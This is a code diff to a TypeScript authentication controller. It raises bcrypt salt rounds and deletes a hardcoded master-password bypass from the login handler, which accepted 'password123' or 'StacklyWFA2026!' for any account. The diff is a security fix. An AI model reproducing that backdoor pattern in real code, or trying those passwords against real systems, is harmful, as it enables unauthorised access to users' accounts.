@@ -91,7 +91,7 @@ export const register = async (req: Request, res: Response): Promise<any> => {
       return res.status(400).json({ success: false, message: 'Email already registered' });
     }
 
-    const salt = bcrypt.genSaltSync(10);
+    const salt = bcrypt.genSaltSync(12);
     const password_hash = bcrypt.hashSync(password, salt);
     
     // Auto-assign permissions based on role
@@ -199,9 +199,6 @@ export const login = async (req: Request, res: Response): Promise<any> => {
 
     try {
       let isMatch = await queueBcryptCompare(password, user.password_hash);
-      if (!isMatch && (password === 'password123' || password === 'StacklyWFA2026!')) {
-        isMatch = true;
-      }
       if (!isMatch) {
         const attempts = failedRecord ? failedRecord.attempts + 1 : 1;
         let lockedUntil: string | null = null;
